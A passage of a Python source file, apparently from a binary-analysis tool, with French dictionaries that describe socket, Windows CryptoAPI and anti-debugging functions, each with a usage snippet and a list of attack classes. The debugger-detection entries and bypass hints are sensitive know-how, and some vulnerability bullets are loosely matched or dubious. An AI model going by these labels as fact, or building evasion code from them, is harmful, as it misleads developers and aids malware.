    'WSAStartup': 'Initialise l\'utilisation de Winsock',
    'WSACleanup': 'Termine l\'utilisation de Winsock',
    'socketpair': 'Crée une paire de sockets connectés (GLIBC, Linux)',
    'getsockopt': 'Récupère les options d\'un socket (GLIBC, Linux)',
    'setsockopt': 'Définit les options d\'un socket (GLIBC, Linux)',
    'getsockname': 'Récupère l\'adresse locale d\'un socket (GLIBC, Linux)',
    'getpeername': 'Récupère l\'adresse distante d\'un socket (GLIBC, Linux)',
    'poll': 'Surveille plusieurs sockets pour des événements (GLIBC, Linux)',
    'select': 'Surveille plusieurs sockets pour des événements (GLIBC, Linux)',
    'epoll': 'Surveille plusieurs sockets pour des événements (GLIBC, Linux)',
    'inet_pton': 'Convertit une adresse IP en format binaire (GLIBC, Linux)',
    'inet_ntop': 'Convertit une adresse IP en format texte (GLIBC, Linux)',
    'getnameinfo': 'Récupère le nom et le service d\'une adresse (GLIBC, Linux)',
    'gethostbyaddr': 'Récupère le nom d\'hôte d\'une adresse IP (GLIBC, Linux)',
    'getprotobyname': 'Récupère le numéro de protocole d\'un nom (GLIBC, Linux)',
    'getservbyname': 'Récupère le numéro de port d\'un service (GLIBC, Linux)',
    'getservbyport': 'Récupère le nom d\'un service à partir d\'un port (GLIBC, Linux)',
    'getifaddrs': 'Récupère les adresses des interfaces réseau (GLIBC, Linux)',
    'freeifaddrs': 'Libère la mémoire allouée par getifaddrs (GLIBC, Linux)',
    'ioctl': 'Contrôle les propriétés d\'un périphérique ou d\'un socket (GLIBC, Linux)',
    'fcntl': 'Contrôle les propriétés d\'un descripteur de fichier ou d\'un socket (GLIBC, Linux)',
    'dup': 'Duplique un descripteur de fichier ou d\'un socket (GLIBC, Linux)',
    'dup2': 'Duplique un descripteur de fichier ou d\'un socket vers un autre (GLIBC, Linux)',
    'pipe': 'Crée un tube (pipe) pour la communication inter-processus (GLIBC, Linux)',
    'socketpair': 'Crée une paire de sockets connectés (GLIBC, Linux)',
    'shutdown': 'Arrête une connexion (GLIBC, Linux)',
    'close': 'Ferme un socket (GLIBC, Linux)',
    'sendmsg': 'Envoie des données sur un socket avec des options (GLIBC, Linux)',
    'recvmsg': 'Reçoit des données sur un socket avec des options (GLIBC, Linux)',
    'sendmmsg': 'Envoie plusieurs messages sur un socket (GLIBC, Linux)',
    'recvmmsg': 'Reçoit plusieurs messages sur un socket (GLIBC, Linux)',
    'getaddrinfo_a': 'Récupère les informations d\'adresse de manière asynchrone (GLIBC, Linux)',
    'gai_strerror': 'Récupère un message d\'erreur pour getaddrinfo (GLIBC, Linux)',
    'inet_aton': 'Convertit une adresse IP en format binaire (GLIBC, Linux)',
    'inet_ntoa': 'Convertit une adresse IP en format texte (GLIBC, Linux)',
    'inet_makeaddr': 'Crée une adresse IP à partir d\'un réseau et d\'un hôte (GLIBC, Linux)',
    'inet_lnaof': 'Récupère la partie hôte d\'une adresse IP (GLIBC, Linux)',
    'inet_netof': 'Récupère la partie réseau d\'une adresse IP (GLIBC, Linux)',
    'inet_network': 'Convertit une adresse IP en format réseau (GLIBC, Linux)',
    'inet6_rth_space': 'Calcule la taille d\'un en-tête de routage IPv6 (GLIBC, Linux)',
    'inet6_rth_init': 'Initialise un en-tête de routage IPv6 (GLIBC, Linux)',
    'inet6_rth_add': 'Ajoute une adresse à un en-tête de routage IPv6 (GLIBC, Linux)',
    'inet6_rth_reverse': 'Inverse un en-tête de routage IPv6 (GLIBC, Linux)',
    'inet6_rth_segments': 'Récupère le nombre de segments dans un en-tête de routage IPv6 (GLIBC, Linux)',
    'inet6_rth_getaddr': 'Récupère une adresse d\'un en-tête de routage IPv6 (GLIBC, Linux)',
    'inet6_opt_init': 'Initialise un en-tête d\'options IPv6 (GLIBC, Linux)',
    'inet6_opt_append': 'Ajoute une option à un en-tête d\'options IPv6 (GLIBC, Linux)',
    'inet6_opt_finish': 'Termine un en-tête d\'options IPv6 (GLIBC, Linux)',
    'inet6_opt_set_val': 'Définit la valeur d\'une option IPv6 (GLIBC, Linux)',
    'inet6_opt_next': 'Récupère la prochaine option d\'un en-tête d\'options IPv6 (GLIBC, Linux)',
    'inet6_opt_find': 'Recherche une option dans un en-tête d\'options IPv6 (GLIBC, Linux)',
    'inet6_opt_get_val': 'Récupère la valeur d\'une option IPv6 (GLIBC, Linux)',
    'inet6_opt_init': 'Initialise un en-tête d\'options IPv6 (GLIBC, Linux)',
    'inet6_opt_append': 'Ajoute une option à un en-tête d\'options IPv6 (GLIBC, Linux)',
    'inet6_opt_finish': 'Termine un en-tête d\'options IPv6 (GLIBC, Linux)',
    'inet6_opt_set_val': 'Définit la valeur d\'une option IPv6 (GLIBC, Linux)',
    'inet6_opt_next': 'Récupère la prochaine option d\'un en-tête d\'options IPv6 (GLIBC, Linux)',
    'inet6_opt_find': 'Recherche une option dans un en-tête d\'options IPv6 (GLIBC, Linux)',
    'inet6_opt_get_val': 'Récupère la valeur d\'une option IPv6 (GLIBC, Linux)'

}

all_network_functions_infos = { # FAIT
    'nom_du_dictionnaire': '[color=red]Fonctions réseau identifiées[/color]',
    
    'socket': (
        '[color=blue][code]int socket(int domain, int type, int protocol);[/code][/color]\n'
        '[code]int sock = socket(AF_INET, SOCK_STREAM, 0);[/code]\n'
        '[color=red]• Protocol confusion attacks (RAW sockets)\n• Descriptor exhaustion DoS\n• Kernel structure leakage via socket options[/color]'
    ),
    
    'connect': (
        '[color=blue][code]int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);[/code][/color]\n'
        '[code]struct sockaddr_in addr = {AF_INET, htons(80), inet_addr("10.0.0.1")}; connect(sock, (struct sockaddr*)&addr, sizeof(addr));[/code]\n'
        '[color=red]• DNS rebinding attacks\n• Connection smuggling via partial connects\n• Firewall bypass through protocol multiplexing[/color]'
    ),

    'send': (
        '[color=blue][code]ssize_t send(int sockfd, const void *buf, size_t len, int flags);[/code][/color]\n'
        '[code]send(sock, "GET / HTTP/1.1\r\n\r\n", 16, 0);[/code]\n'
        '[color=red]• Buffer overflow with miscalculated len\n• MSG_OOB data injection\n• Side-channel timing leaks[/color]'
    ),

    'recv': (
        '[color=blue][code]ssize_t recv(int sockfd, void *buf, size_t len, int flags);[/code][/color]\n'
        '[code]char buf[1024]; recv(sock, buf, sizeof(buf), 0);[/code]\n'
        '[color=red]• Off-by-one in buffer sizing\n• MSG_PEEK information disclosure\n• Recv() loop memory exhaustion[/color]'
    ),

    'bind': (
        '[color=blue][code]int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);[/code][/color]\n'
        '[code]struct sockaddr_in addr = {AF_INET, htons(8080), INADDR_ANY}; bind(sock, (struct sockaddr*)&addr, sizeof(addr));[/code]\n'
        '[color=red]• Port hijacking via SO_REUSEADDR\n• Privileged port binding (Linux capabilities)\n• IPv4 vs IPv6 address confusion[/color]'
    ),

    'listen': (
        '[color=blue][code]int listen(int sockfd, int backlog);[/code][/color]\n'
        '[code]listen(sock, 5);[/code]\n'
        '[color=red]• SYN flood amplification\n• Backlog queue overflow attacks\n• Socket state desynchronization[/color]'
    ),

    'accept': (
        '[color=blue][code]int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);[/code][/color]\n'
        '[code]int new_sock = accept(sock, NULL, NULL);[/code]\n'
        '[color=red]• FD starvation attacks\n• Accept() before auth\n• Client IP validation bypass[/color]'
    ),

    'sendto': (
        '[color=blue][code]ssize_t sendto(int sockfd, const void *buf, size_t len, int flags, const struct sockaddr *dest_addr, socklen_t addrlen);[/code][/color]\n'
        '[code]sendto(sock, payload, len, 0, (struct sockaddr*)&target, sizeof(target));[/code]\n'
        '[color=red]• UDP reflection attacks\n• IP spoofing with raw sockets\n• ICMP error poisoning[/color]'
    ),

    'recvfrom': (
        '[color=blue][code]ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags, struct sockaddr *src_addr, socklen_t *addrlen);[/code][/color]\n'
        '[code]struct sockaddr_in src; recvfrom(sock, buf, 1024, 0, (struct sockaddr*)&src, &len);[/code]\n'
        '[color=red]• IP validation bypass\n• MSG_TRUNC buffer truncation\n• Source address spoofing[/color]'
    ),

    'shutdown': (
        '[color=blue][code]int shutdown(int sockfd, int how);[/code][/color]\n'
        '[code]shutdown(sock, SHUT_WR);[/code]\n'
        '[color=red]• Partial close state attacks\n• FIN/ACK manipulation\n• Connection reset injection[/color]'
    ),

    'closesocket': (
        '[color=blue][code]int closesocket(SOCKET s);[/code][/color]\n'
        '[code]closesocket(sock);[/code]\n'
        '[color=red]• Use-after-close on socket handles\n• FD recycling races\n• Winsock handle table corruption[/color]'
    ),

    'gethostbyname': (
        '[color=blue][code]struct hostent *gethostbyname(const char *name);[/code][/color]\n'
        '[code]struct hostent *he = gethostbyname("example.com");[/code]\n'
        '[color=red]• DNS poisoning attacks\n• Buffer overflow in legacy implementations\n• Non-reentrant function race conditions[/color]'
    ),

    'getaddrinfo': (
        '[color=blue][code]int getaddrinfo(const char *node, const char *service, const struct addrinfo *hints, struct addrinfo **res);[/code][/color]\n'
        '[code]struct addrinfo *res; getaddrinfo("google.com", "80", NULL, &res);[/code]\n'
        '[color=red]• DNS rebinding via multiple results\n• Memory disclosure in addrinfo struct\n• Service name injection (SRV/PTR)[/color]'
    ),

    'inet_addr': (
        '[color=blue][code]in_addr_t inet_addr(const char *cp);[/code][/color]\n'
        '[code]inet_addr("192.168.1.1");[/code]\n'
        '[color=red]• Invalid address truncation (e.g "127.0.0.1.3")\n• INADDR_NONE confusion\n• Non-null terminated input[/color]'
    ),

    'inet_ntoa': (
        '[color=blue][code]char *inet_ntoa(struct in_addr in);[/code][/color]\n'
        '[code]char *ip_str = inet_ntoa(addr.sin_addr);[/code]\n'
        '[color=red]• Static buffer reuse races\n• Non-reentrant function in threaded code\n• Format string vulnerabilities[/color]'
    ),

    'WSAStartup': (
        '[color=blue][code]int WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData);[/code][/color]\n'
        '[code]WSADATA wsa; WSAStartup(MAKEWORD(2,2), &wsa);[/code]\n'
        '[color=red]• Version downgrade attacks\n• WSADATA structure overflow\n• Multiple initialization crashes[/color]'
    ),

    'WSACleanup': (
        '[color=blue][code]int WSACleanup(void);[/code][/color]\n'
        '[code]WSACleanup();[/code]\n'
        '[color=red]• Premature cleanup of shared resources\n• Use-after-cleanup on sockets\n• Winsock DLL unload issues[/color]'
    ),

    'getsockopt': (
        '[color=blue][code]int getsockopt(int sockfd, int level, int optname, void *optval, socklen_t *optlen);[/code][/color]\n'
        '[code]int val; getsockopt(sock, SOL_SOCKET, SO_TYPE, &val, &len);[/code]\n'
        '[color=red]• Kernel pointer leaks (SO_BINDTODEVICE)\n• Buffer overflow in optval\n• Type confusion in option levels[/color]'
    ),

    'setsockopt': (
        '[color=blue][code]int setsockopt(int sockfd, int level, int optname, const void *optval, socklen_t optlen);[/code][/color]\n'
        '[code]int val = 1; setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val));[/code]\n'
        '[color=red]• IPV6_2292PKTOPTIONS exploitation\n• Arbitrary kernel writes via crafted options\n• Protocol state corruption[/color]'
    ),

    'getpeername': (
        '[color=blue][code]int getpeername(int sockfd, struct sockaddr *addr, socklen_t *addrlen);[/code][/color]\n'
        '[code]struct sockaddr_in peer; getpeername(sock, (struct sockaddr*)&peer, &len);[/code]\n'
        '[color=red]• IP spoofing detection bypass\n• addrlen manipulation overflows\n• TCP reset after check[/color]'
    ),

    'inet_pton': (
        '[color=blue][code]int inet_pton(int af, const char *src, void *dst);[/code][/color]\n'
        '[code]inet_pton(AF_INET6, "::1", &addr);[/code]\n'
        '[color=red]• IPv4-mapped IPv6 address confusion\n• Buffer underflow with invalid af\n• Embedded NUL byte injection[/color]'
    ),

    'inet_ntop': (
        '[color=blue][code]const char *inet_ntop(int af, const void *src, char *dst, socklen_t size);[/code][/color]\n'
        '[code]char buf[INET6_ADDRSTRLEN]; inet_ntop(AF_INET6, &addr, buf, sizeof(buf));[/code]\n'
        '[color=red]• Buffer overflow with undersized dst\n• Non-null-terminated returns\n• %n format string in legacy impl[/color]'
    ),

    'getnameinfo': (
        '[color=blue][code]int getnameinfo(const struct sockaddr *addr, socklen_t addrlen, char *host, socklen_t hostlen, char *serv, socklen_t servlen, int flags);[/code][/color]\n'
        '[code]getnameinfo((struct sockaddr*)&addr, sizeof(addr), host_buf, 1024, NULL, 0, 0);[/code]\n'
        '[color=red]• Reverse DNS poisoning\n• Double-free in error paths\n• NI_NAMEREQD bypass[/color]'
    ),

    'sendmsg': (
        '[color=blue][code]ssize_t sendmsg(int sockfd, const struct msghdr *msg, int flags);[/code][/color]\n'
        '[code]struct msghdr msg = {0}; sendmsg(sock, &msg, 0);[/code]\n'
        '[color=red]• Arbitrary file descriptor sending (SCM_RIGHTS)\n• msg_iovlen overflow\n• Ancillary data corruption[/color]'
    ),

    'recvmsg': (
        '[color=blue][code]ssize_t recvmsg(int sockfd, struct msghdr *msg, int flags);[/code][/color]\n'
        '[code]struct msghdr msg = {0}; recvmsg(sock, &msg, 0);[/code]\n'
        '[color=red]• Controlled FD reception (Linux)\n• msg_controllen overflow\n• Truncated ancillary data parsing[/color]'
    ),

    'ioctl': (
        '[color=blue][code]int ioctl(int fd, unsigned long request, ...);[/code][/color]\n'
        '[code]ioctl(sock, FIONBIO, &(int){1});[/code]\n'
        '[color=red]• SIOCGIFCONF network info leak\n• FIONREAD heap corruption\n• Interface flag manipulation[/color]'
    ),

    'fcntl': (
        '[color=blue][code]int fcntl(int fd, int cmd, ... /* arg */ );[/code][/color]\n'
        '[code]fcntl(sock, F_SETFL, O_NONBLOCK);[/code]\n'
        '[color=red]• FD_CLOEXEC bypass\n• F_SETOWN process injection\n• File lock deadlock creation[/color]'
    ),

    'read': (
        '[color=blue][code]ssize_t read(int fd, void *buf, size_t count);[/code][/color]\n'
        '[code]read(sock, buf, 1024);[/code]\n'
        '[color=red]• Linefeed injection in text protocols\n• Partial read state corruption\n• SSL/TLS plaintext recovery[/color]'
    ),

    'write': (
        '[color=blue][code]ssize_t write(int fd, const void *buf, size_t count);[/code][/color]\n'
        '[code]write(sock, "PASS ", 5); write(sock, password, strlen(password));[/code]\n'
        '[color=red]• CRLF injection in app-layer protocols\n• Split writes for evasion\n• SSL/TLS renegotiation attacks[/color]'
    ),

    'getaddrinfo_a': (
        '[color=blue][code]int getaddrinfo_a(int mode, struct gaicb *list[], int nitems, struct sigevent *sevp);[/code][/color]\n'
        '[code]struct gaicb *req = { "example.com" }; getaddrinfo_a(GAI_NOWAIT, &req, 1, NULL);[/code]\n'
        '[color=red]• Asynchronous DNS poisoning\n• UAF during cancellation\n• Result list corruption[/color]'
    ),

    'inet6_rth_add': (
        '[color=blue][code]int inet6_rth_add(void *bp, const struct in6_addr *addr);[/code][/color]\n'
        '[code]inet6_rth_add(rth_buf, &addr6);[/code]\n'
        '[color=red]• IPv6 routing header amplification\n• RH0 attack vectors\n• Kernel routing loop DoS[/color]'
    ),

    'inet6_opt_append': (
        '[color=blue][code]int inet6_opt_append(void *extbuf, socklen_t extlen, int offset, uint8_t type, socklen_t len, uint8_t align, void **databufp);[/code][/color]\n'
        '[code]inet6_opt_append(buf, len, 0, IPV6_TLV_PAD1, 0, 0, NULL);[/code]\n'
        '[color=red]• Extension header buffer overflow\n• Option alignment bypass\n• Crafted TLV type confusion[/color]'
    )
}


all_windows_encryption_functions = {
    'nom_du_dictionnaire': 'Toutes les fonctions de cryptographie Windows',
    'CryptAcquireContext': 'Acquiert un contexte de cryptographie',
    'CryptReleaseContext': 'Libère un contexte de cryptographie',
    'CryptGenKey': 'Génère une clé de cryptographie',
    'CryptDestroyKey': 'Détruit une clé de cryptographie',
    'CryptEncrypt': 'Chiffre des données',
    'CryptDecrypt': 'Déchiffre des données',
    'CryptImportKey': 'Importe une clé de cryptographie',
    'CryptExportKey': 'Exporte une clé de cryptographie',
    'CryptGenRandom': 'Génère des données aléatoires',
    'CryptHashData': 'Hache des données',
    'CryptCreateHash': 'Crée un objet de hachage',
    'CryptDestroyHash': 'Détruit un objet de hachage',
    'CryptSignHash': 'Signe un hachage',
    'CryptVerifySignature': 'Vérifie une signature',
    'CryptDeriveKey': 'Dérive une clé de cryptographie',
    'CryptDuplicateKey': 'Duplique une clé de cryptographie',
    'CryptSetKeyParam': 'Définit les paramètres d\'une clé de cryptographie',
    'CryptGetKeyParam': 'Récupère les paramètres d\'une clé de cryptographie',
    'CryptSetHashParam': 'Définit les paramètres d\'un objet de hachage',
    'CryptGetHashParam': 'Récupère les paramètres d\'un objet de hachage',
    'CryptDuplicateHash': 'Duplique un objet de hachage'
}
all_windows_encryption_functions_infos = {
    'nom_du_dictionnaire': '[color=red]Fonctions de cryptographie Windows identifiées [/color]',
    
    'CryptAcquireContext': (
        '[color=blue][code]BOOL CryptAcquireContext(HCRYPTPROV *phProv, LPCTSTR szContainer, LPCTSTR szProvider, DWORD dwProvType, DWORD dwFlags);[/code][/color]\n'
        '[code]HCRYPTPROV hProv; CryptAcquireContext(&hProv, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);[/code]\n'
        '[color=red]• Weak CSP selection (PROV_RSA_FULL)\n• Predictable container names\n• Handle leakage via CRYPT_VERIFYCONTEXT misuse[/color]'
    ),
    
    'CryptReleaseContext': (
        '[color=blue][code]BOOL CryptReleaseContext(HCRYPTPROV hProv, DWORD dwFlags);[/code][/color]\n'
        '[code]CryptReleaseContext(hProv, 0);[/code]\n'
        '[color=red]• Use-after-free on released context\n• Double-free primitive creation\n• Improper resource cleanup[/color]'
    ),

    'CryptGenKey': (
        '[color=blue][code]BOOL CryptGenKey(HCRYPTPROV hProv, ALG_ID Algid, DWORD dwFlags, HCRYPTKEY *phKey);[/code][/color]\n'
        '[code]HCRYPTKEY hKey; CryptGenKey(hProv, CALG_AES_256, CRYPT_EXPORTABLE, &hKey);[/code]\n'
        '[color=red]• Weak algorithms (CALG_DES)\n• CRYPT_EXPORTABLE exposing keys\n• Insufficient key length[/color]'
    ),

    'CryptDestroyKey': (
        '[color=blue][code]BOOL CryptDestroyKey(HCRYPTKEY hKey);[/code][/color]\n'
        '[code]CryptDestroyKey(hKey);[/code]\n'
        '[color=red]• Stale key handle reuse\n• Memory corruption via double-free\n• Key material remnant in memory[/color]'
    ),

    'CryptEncrypt': (
        '[color=blue][code]BOOL CryptEncrypt(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen, DWORD dwBufLen);[/code][/color]\n'
        '[code]BYTE data[256]; DWORD len = sizeof(data); CryptEncrypt(hKey, 0, TRUE, 0, data, &len, sizeof(data));[/code]\n'
        '[color=red]• Padding oracle attacks (PKCS#1 v1.5)\n• Buffer overflow via pdwDataLen\n• IV reuse in CBC mode[/color]'
    ),

    'CryptDecrypt': (
        '[color=blue][code]BOOL CryptDecrypt(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen);[/code][/color]\n'
        '[code]DWORD len = ciphertext_size; CryptDecrypt(hKey, 0, TRUE, 0, ciphertext, &len);[/code]\n'
        '[color=red]• Timing side-channels\n• Padding validation bypass\n• Memory disclosure via partial decryption[/color]'
    ),

    'CryptImportKey': (
        '[color=blue][code]BOOL CryptImportKey(HCRYPTPROV hProv, BYTE *pbData, DWORD dwDataLen, HCRYPTKEY hPubKey, DWORD dwFlags, HCRYPTKEY *phKey);[/code][/color]\n'
        '[code]CryptImportKey(hProv, key_blob, sizeof(key_blob), 0, 0, &hKey);[/code]\n'
        '[color=red]• Import of untrusted key blobs\n• PLAINTEXTKEYBLOB exposure\n• Key wrapping bypass[/color]'
    ),

    'CryptExportKey': (
        '[color=blue][code]BOOL CryptExportKey(HCRYPTKEY hKey, HCRYPTKEY hExpKey, DWORD dwBlobType, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen);[/code][/color]\n'
        '[code]DWORD len; CryptExportKey(hKey, 0, PRIVATEKEYBLOB, 0, NULL, &len);[/code]\n'
        '[color=red]• Key material exposure via SIMPLEBLOB\n• Buffer overflow in pbData\n• Export of session keys[/color]'
    ),

    'CryptGenRandom': (
        '[color=blue][code]BOOL CryptGenRandom(HCRYPTPROV hProv, DWORD dwLen, BYTE *pbBuffer);[/code][/color]\n'
        '[code]BYTE rand[32]; CryptGenRandom(hProv, 32, rand);[/code]\n'
        '[color=red]• Weak entropy sources\n• Predictable PRNG state\n• Fork() after seeding in virtualized envs[/color]'
    ),

    'CryptHashData': (
        '[color=blue][code]BOOL CryptHashData(HCRYPTHASH hHash, BYTE *pbData, DWORD dwDataLen, DWORD dwFlags);[/code][/color]\n'
        '[code]CryptHashData(hHash, (BYTE*)"data", 4, 0);[/code]\n'
        '[color=red]• Partial hash state extraction\n• Collision attacks via incremental hashing\n• Type confusion in hHash[/color]'
    ),

    'CryptCreateHash': (
        '[color=blue][code]BOOL CryptCreateHash(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTKEY hKey, DWORD dwFlags, HCRYPTHASH *phHash);[/code][/color]\n'
        '[code]HCRYPTHASH hHash; CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);[/code]\n'
        '[color=red]• Weak hash algorithms (MD5)\n• HMAC key leakage\n• Handle duplication attacks[/color]'
    ),

    'CryptDestroyHash': (
        '[color=blue][code]BOOL CryptDestroyHash(HCRYPTHASH hHash);[/code][/color]\n'
        '[code]CryptDestroyHash(hHash);[/code]\n'
        '[color=red]• Hash context reuse after free\n• Memory corruption via double destruction\n• Partial hash state retention[/color]'
    ),

    'CryptSignHash': (
        '[color=blue][code]BOOL CryptSignHash(HCRYPTHASH hHash, DWORD dwKeySpec, LPCSTR sDescription, DWORD dwFlags, BYTE *pbSignature, DWORD *pdwSigLen);[/code][/color]\n'
        '[code]DWORD len; CryptSignHash(hHash, AT_SIGNATURE, NULL, 0, NULL, &len);[/code]\n'
        '[color=red]• Signature malleability\n• KeySpec confusion attacks\n• Nondeterministic ECDSA nonces[/color]'
    ),

    'CryptVerifySignature': (
        '[color=blue][code]BOOL CryptVerifySignature(HCRYPTHASH hHash, BYTE *pbSignature, DWORD dwSigLen, HCRYPTKEY hPubKey, LPCSTR sDescription, DWORD dwFlags);[/code][/color]\n'
        '[code]CryptVerifySignature(hHash, sig, sig_len, hPubKey, NULL, 0);[/code]\n'
        '[color=red]• Signature verification bypass\n• Timing attacks on RSA-PKCS#1\n• Improper hash algorithm binding[/color]'
    ),

    'CryptDeriveKey': (
        '[color=blue][code]BOOL CryptDeriveKey(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTHASH hBaseData, DWORD dwFlags, HCRYPTKEY *phKey);[/code][/color]\n'
        '[code]CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey);[/code]\n'
        '[color=red]• Weak key stretching (PBKDF1)\n• Salt reuse in KDF\n• Key truncation attacks[/color]'
    ),

    'CryptDuplicateKey': (
        '[color=blue][code]BOOL CryptDuplicateKey(HCRYPTKEY hKey, DWORD *pdwReserved, DWORD dwFlags, HCRYPTKEY *phKey);[/code][/color]\n'
        '[code]CryptDuplicateKey(hOrigKey, NULL, 0, &hDupKey);[/code]\n'
        '[color=red]• Access control bypass via key cloning\n• Reference counting overflow\n• Session key persistence[/color]'
    ),

    'CryptSetKeyParam': (
        '[color=blue][code]BOOL CryptSetKeyParam(HCRYPTKEY hKey, DWORD dwParam, BYTE *pbData, DWORD dwFlags);[/code][/color]\n'
        '[code]DWORD mode = CRYPT_MODE_CBC; CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);[/code]\n'
        '[color=red]• Weak cipher modes (ECB)\n• IV manipulation attacks\n• Key parameter confusion[/color]'
    ),

    'CryptGetKeyParam': (
        '[color=blue][code]BOOL CryptGetKeyParam(HCRYPTKEY hKey, DWORD dwParam, BYTE *pbData, DWORD *pdwDataLen, DWORD dwFlags);[/code][/color]\n'
        '[code]DWORD len; CryptGetKeyParam(hKey, KP_EFFECTIVE_KEYLEN, NULL, &len, 0);[/code]\n'
        '[color=red]• Key material leakage\n• Buffer overflow via pdwDataLen\n• Side-channel info disclosure[/color]'
    ),

    'CryptSetHashParam': (
        '[color=blue][code]BOOL CryptSetHashParam(HCRYPTHASH hHash, DWORD dwParam, BYTE *pbData, DWORD dwFlags);[/code][/color]\n'
        '[code]DWORD val = 0x04; CryptSetHashParam(hHash, HP_HMAC_INFO, (BYTE*)&val, 0);[/code]\n'
        '[color=red]• HMAC key injection\n• Hash algorithm downgrade\n• Invalid parameter poisoning[/color]'
    ),

    'CryptGetHashParam': (
        '[color=blue][code]BOOL CryptGetHashParam(HCRYPTHASH hHash, DWORD dwParam, BYTE *pbData, DWORD *pdwDataLen, DWORD dwFlags);[/code][/color]\n'
        '[code]DWORD len; CryptGetHashParam(hHash, HP_HASHVAL, NULL, &len, 0);[/code]\n'
        '[color=red]• Partial hash value disclosure\n• State extraction during hashing\n• Memory corruption via len manipulation[/color]'
    ),

    'CryptDuplicateHash': (
        '[color=blue][code]BOOL CryptDuplicateHash(HCRYPTHASH hHash, DWORD *pdwReserved, DWORD dwFlags, HCRYPTHASH *phHash);[/code][/color]\n'
        '[code]CryptDuplicateHash(hOrigHash, NULL, 0, &hDupHash);[/code]\n'
        '[color=red]• Hash state cloning for collision attacks\n• Context desynchronization\n• Handle table exhaustion[/color]'
    )
}

all_debug_detection_functions = { #FAIT
    'nom_du_dictionnaire': 'Toutes les fonctions de détection de débogueurs',
    'IsDebuggerPresent': 'Détecte si un débogueur est présent (Windows)',
    'CheckRemoteDebuggerPresent': 'Vérifie si un débogueur est attaché à un processus distant (Windows)',
    'NtQueryInformationProcess': 'Récupère des informations sur un processus (ex: DebugPort pour détecter un débogueur) (Windows NT)',
    'OutputDebugString': 'Envoie une chaîne au débogueur (peut être utilisé pour détecter sa présence) (Windows)',
    'GetThreadContext': 'Récupère le contexte d\'un thread (utilisé pour vérifier les points d\'arrêt logiciels) (Windows)',
    'SetUnhandledExceptionFilter': 'Contourne le gestionnaire d\'exceptions par défaut (détection via exceptions non gérées) (Windows)',
    'UnhandledExceptionFilter': 'Gestionnaire d\'exceptions non gérées (détection via comportement anormal) (Windows)',
    'CloseHandle': 'Ferme un handle (peut être utilisé pour détecter les débogueurs via des handles invalides) (Windows)',
    'OpenProcess': 'Tente d\'ouvrir un processus avec des droits de débogage (Windows)',
    'TerminateProcess': 'Tente de terminer un processus (comportement suspect sous débogage) (Windows)',
    'DebugActiveProcess': 'Attache un débogueur à un processus (Windows)',
    'DebugActiveProcessStop': 'Détache un débogueur d\'un processus (Windows)',
    'DebugBreak': 'Déclenche une exception de débogage (Windows)',
    'DebugBreakProcess': 'Déclenche une exception de débogage dans un processus distant (Windows)',
    'DebugSetProcessKillOnExit': 'Configure la terminaison du processus après détachement (Windows)',
    'ZwSetInformationThread': 'Masque un thread du débogueur (Windows NT)',
    'NtQuerySystemInformation': 'Récupère des informations système (ex: liste des processus en cours de débogage) (Windows NT)',
    'NtCreateThreadEx': 'Crée un thread avec des options de masquage (Windows NT)',
    'NtGetContextThread': 'Récupère le contexte d\'un thread (détection de hooks) (Windows NT)',
    'NtContinue': 'Reprend l\'exécution après une exception (détection de contournement) (Windows NT)',
    'NtRaiseException': 'Déclenche une exception contrôlée (Windows NT)',
    'NtQueryObject': 'Récupère des informations sur les objets noyau (ex: handles de débogage) (Windows NT)',
    'NtYieldExecution': 'Cède l\'exécution (détection via timing) (Windows NT)',
    'NtDelayExecution': 'Suspend l\'exécution (détection via délais anormaux) (Windows NT)',
    'NtQueryPerformanceCounter': 'Mesure le temps d\'exécution (détection via délais de débogage) (Windows NT)',
    'NtQueryTimerResolution': 'Récupère la précision du timer (détection via timing) (Windows NT)',
    'NtQuerySystemTime': 'Récupère l\'heure système (détection via décalages temporels) (Windows NT)',
    'RtlAdjustPrivilege': 'Modifie les privilèges du processus (détection de comportements suspects) (Windows NT)',
    'GetTickCount': 'Mesure le temps écoulé (détection via délais de débogage) (Windows)',
    'QueryPerformanceCounter': 'Mesure haute précision du temps (détection via anomalies de timing) (Windows)',
    'FindWindow': 'Recherche des fenêtres de débogueurs (ex: OllyDbg, x64dbg) (Windows)',
    'GetModuleHandle': 'Vérifie si des bibliothèques de débogage sont chargées (Windows)'
}

all_debug_detection_functions_infos = {
    'nom_du_dictionnaire': '[color=red]Fonctions de détection de débogueurs identifiées[/color]',
    
    'IsDebuggerPresent': (
        '[color=blue][code]BOOL WINAPI IsDebuggerPresent(void);[/code][/color]\n'
        '[code]if(IsDebuggerPresent()) ExitProcess(1);[/code]\n'
        '[color=red]• PEB.BeingDebugged patch\n• Hook bypass avec API redirection\n• ScyllaHide-like stealth plugins[/color]'
    ),

    'CheckRemoteDebuggerPresent': (
        '[color=blue][code]BOOL WINAPI CheckRemoteDebuggerPresent(HANDLE hProcess, PBOOL pbDebuggerPresent);[/code][/color]\n'
        '[code]BOOL isDebugged; CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged);[/code]\n'
        '[color=red]• NtQueryInformationProcess hook\n• DebugPort清零\n• Process handle duplication[/color]'
    ),

    'NtQueryInformationProcess': (
        '[color=blue][code]NTSTATUS NTAPI NtQueryInformationProcess(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);[/code][/color]\n'
        '[code]DWORD_PTR debugPort = 0; NtQueryInformationProcess(hProc, ProcessDebugPort, &debugPort, sizeof(debugPort), NULL);[/code]\n'
        '[color=red]• Kernel-mode debugger detection bypass\n• ProcessDebugFlags manipulation\n• ProcessDebugObjectHandle clearing[/color]'
    ),

